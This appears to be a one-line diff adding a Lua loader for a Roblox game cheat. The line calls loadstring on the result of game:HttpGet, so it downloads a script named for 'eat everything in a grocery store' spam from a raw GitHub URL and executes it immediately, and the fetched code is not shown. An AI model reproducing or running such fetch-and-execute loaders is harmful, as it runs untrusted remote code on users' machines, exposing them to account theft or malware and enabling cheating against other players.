@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/eat-everything-in-a-grocery-store-spam2-4mt7nf6ioazquu.lua"))()
